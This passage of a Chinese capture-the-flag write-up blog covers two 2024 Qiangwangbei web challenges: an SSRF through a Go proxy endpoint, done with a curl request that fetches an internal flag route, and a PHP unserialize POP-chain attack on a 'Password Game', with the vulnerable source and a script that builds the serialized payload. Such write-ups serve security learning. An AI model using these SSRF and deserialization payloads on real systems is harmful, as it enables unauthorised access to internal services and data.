class="number">0</span>])</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			c.Writer.Write(body)</span><br><span class="line">			c.Abort()</span><br><span class="line">		&#125;)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	r.Run(<span class="string">&quot;127.0.0.1:8769&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>分析得到发包格式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">type ProxyRequest struct &#123;</span><br><span class="line">	URL             string            `json:&quot;url&quot; binding:&quot;required&quot;`</span><br><span class="line">	Method          string            `json:&quot;method&quot; binding:&quot;required&quot;`</span><br><span class="line">	Body            string            `json:&quot;body&quot;`</span><br><span class="line">	Headers         map[string]string `json:&quot;headers&quot;`</span><br><span class="line">	FollowRedirects bool              `json:&quot;follow_redirects&quot;`</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">v1 := r.Group(&quot;/v1&quot;)</span><br><span class="line">	&#123;</span><br><span class="line">		v1.POST(&quot;/api/flag&quot;, func(c *gin.Context) &#123;</span><br><span class="line">			cmd := exec.Command(&quot;/readflag&quot;)</span><br><span class="line">			flag, err := cmd.CombinedOutput()</span><br><span class="line">			if err != nil &#123;</span><br><span class="line">				c.JSON(http.StatusInternalServerError, gin.H&#123;&quot;status&quot;: &quot;error&quot;, &quot;message&quot;: &quot;Internal Server Error&quot;&#125;)</span><br><span class="line">				return</span><br><span class="line">			&#125;</span><br><span class="line">			c.JSON(http.StatusOK, gin.H&#123;&quot;flag&quot;: flag&#125;)</span><br><span class="line">		&#125;)</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>根据分析，直接curl发包就行了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">t1an@LAPTOP-A8BOAIJO:~$ curl -X POST http://101.200.33.255:24655/v2/api/proxy -H &quot;Content-Type: application/json&quot; -d &#x27;&#123;</span><br><span class="line">    &quot;url&quot;: &quot;http://127.0.0.1:8769/v1/api/flag&quot;,</span><br><span class="line">    &quot;method&quot;: &quot;POST&quot;,</span><br><span class="line">    &quot;body&quot;: &quot;&quot;,</span><br><span class="line">    &quot;headers&quot;: &#123;&#125;,</span><br><span class="line">    &quot;follow_redirects&quot;: false</span><br><span class="line">&#125;&#x27;</span><br><span class="line">&#123;&quot;flag&quot;:&quot;ZmxhZ3tkOTQ3N2MxOS0xMDNiLTQ4NmMtYjk1NS1jNDljNWM1MTE5ZmR9&quot;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Password-Game"><a href="#Password-Game" class="headerlink" title="Password Game"></a>Password Game</h3><p>题目名为passwordgame，看起来是一个密码游戏。。<br><img src="/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/2f14b89d712eaaf3d40fd4a889488411.png"></p>
<p>会给我重定向？哦哦哦在输入用户名里没看见</p>
<p><img src="/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/e227cfb2844a0c84697957d9004d7422.png"></p>
<p>也就是说输入密码只有3s，bp抓包。</p>
<p><img src="/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/61926f17ecdfcf7d610fa3dcd3b13921.png"></p>
<p><img src="/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/6c88eee2b7e07c4fa9524a3c4522fb07.png"></p>
<p>29的倍数</p>
<p><img src="/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/a57b8525a5484f8de364d7f32d307576.png"></p>
<p>还要包含29444+25&#x3D;29469<br><img src="/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/0ebcec49621e56c347155e95f8a67198.png"></p>
<p>加上了好像又要满足规则2 继续改下。<br><img src="/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/6b7dda1e7cdc7875f34c32ee5c28708f.png"></p>
<p>发现了一个新东西，类似反序列化</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">function <span class="title function_">filter</span><span class="params">($password)</span>&#123;</span><br><span class="line"></span><br><span class="line">$filter_arr = array(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;2024qwb&quot;</span>);</span><br><span class="line"></span><br><span class="line">$filter = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&quot;|&quot;</span>,$filter_arr).<span class="string">&#x27;/i&#x27;</span>; <span class="keyword">return</span> preg_replace($filter,<span class="string">&quot;nonono&quot;</span>,$password);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">guest</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> $username; <span class="keyword">public</span> $value;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> function       <span class="title function_">tostring</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($<span class="built_in">this</span>-&gt;username==<span class="string">&quot;guest&quot;</span>)&#123;</span><br><span class="line"></span><br><span class="line">$value();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> $<span class="built_in">this</span>-&gt;username;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> function       <span class="title function_">call</span><span class="params">($key,$value)</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($<span class="built_in">this</span>-&gt;username==md5($GLOBALS[<span class="string">&quot;flag&quot;</span>]))&#123; echo $GLOBALS[<span class="string">&quot;flag&quot;</span>];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">root</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> $username; <span class="keyword">public</span> $value;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> function       <span class="title function_">get</span><span class="params">($key)</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strpos($<span class="built_in">this</span>-&gt;username, <span class="string">&quot;admin&quot;</span>) == <span class="number">0</span> &amp;&amp; $<span class="built_in">this</span>-</span><br><span class="line"></span><br><span class="line">&gt;value == <span class="string">&quot;2024qwb&quot;</span>)&#123;</span><br><span class="line"></span><br><span class="line">$<span class="built_in">this</span>-&gt;value = $GLOBALS[<span class="string">&quot;flag&quot;</span>]; echo <span class="title function_">md5</span><span class="params">(<span class="string">&quot;hello:&quot;</span>.$<span class="built_in">this</span>-&gt;value)</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">user</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> $username; <span class="keyword">public</span> $password; <span class="keyword">public</span> $value;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> function   <span class="title function_">invoke</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">  $<span class="built_in">this</span>-&gt;username=md5($GLOBALS[<span class="string">&quot;flag&quot;</span>]); <span class="keyword">return</span> $<span class="built_in">this</span>-&gt;password-&gt;guess();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> function <span class="title function_">_destruct</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strpos($<span class="built_in">this</span>-&gt;username, <span class="string">&quot;admin&quot;</span>) == <span class="number">0</span> )&#123; echo <span class="string">&quot;hello&quot;</span>.$<span class="built_in">this</span>-&gt;username;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user=unserialize(filter($_POST[<span class="string">&quot;password&quot;</span>])); <span class="keyword">if</span>(strpos($user-&gt;username, <span class="string">&quot;admin&quot;</span>) == <span class="number">0</span> &amp;&amp; $user-&gt;password</span><br><span class="line"></span><br><span class="line">== <span class="string">&quot;2024qwb&quot;</span>)&#123;</span><br><span class="line"></span><br><span class="line">echo <span class="string">&quot;hello!&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码审计，在root类中的get方法通过赋值，把全局变量中的flag赋值给了value属性。我们要找到哪里可以调用到get方法。</p>
<p>在反序列化函数最下面有一个if，这里接收的是反序列化字符串通过filter方法后的值</p>
<p>由于存在$User-&gt;password，那么此时我们的root类序列化字符串中并没有password属性，那么进行反序列化函数执行后又进行了访问password，所以此时是访问了不存在的属性。自动调用魔术方法get，构造成功。</p>
<p>但是返回的是md5后的flag。还得另寻他法。</p>
<p>通过半小时的研究在user类中的destruct函数中发现了返回属性值的操作。</p>
<p>这里可以设置user类的username与root类的value共用一个内存地址。也就是引用此时就可以echo 出flag了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sum</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$su</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>); <span class="variable">$i</span>++)&#123; <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$a</span>[<span class="variable">$i</span>]))&#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$su</span> += <span class="variable">$a</span>[<span class="variable">$i</span>];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$su</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">root</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="variable">$username</span>; <span class="keyword">public</span> <span class="variable">$value</span>; <span class="keyword">public</span> <span class="variable">$asd</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="variable">$username</span>; <span class="keyword">public</span> <span class="variable">$password</span>; <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">root</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt;username = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt;value = <span class="number">2024</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt;asd = <span class="keyword">new</span> <span class="title function_ invoke__">user</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt;asd-&gt;username = &amp;<span class="variable">$a</span>-&gt;value;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt;asd-&gt;value = <span class="string">&quot;3929469&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 上面的值由于我们计算的结果为29469，所以一定要包含5个数字</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>); <span class="keyword">echo</span> <span class="variable">$ser</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">sum</span>(<span class="variable">$ser</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/e1e8486d894cd10da0ec2ecbe21777e4.png"><img src="/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/d168b1de851417ddc73ce6caee30c9eb.png"><br>改为3929469结果就为116了是29的倍数<br><img src="/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/738ddb6b27313f609dc9ddca236ed7ee.png"><img src="/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/c9390bf6e8e517b4811cc7b49bb242d6.png"></p>

      
    </div>
    
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2024/11/29/Go/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">&lt;</strong>
      <div class="article-nav-title">
        
          Go
        
      </div>
    </a>
  
  
    <a href="/2024/11/29/Java/" id="article-nav-older" class="article-nav-link-wrap">
      <div class="article-nav-title">Java</div>
      <strong class="article-nav-caption">&gt;</strong>
    </a>
  
</nav>

  
</article>






</div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
      <div class="footer-left">
        &copy; 2024 T1ng
      </div>
        <div class="footer-right">
          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/preccrep/hexo-theme-jelly" target="_blank">Jelly</a>
        </div>
    </div>
  </div>
</footer>
    </div>
    
  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">



<script>
	var yiliaConfig = {
		fancybox: true,
		mathjax: false,
		animate: true,
		isHome: false,
		isPost: true,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false
	}
</script>

<script src="/js/main.js"></script>




  </div>
</body>
</html>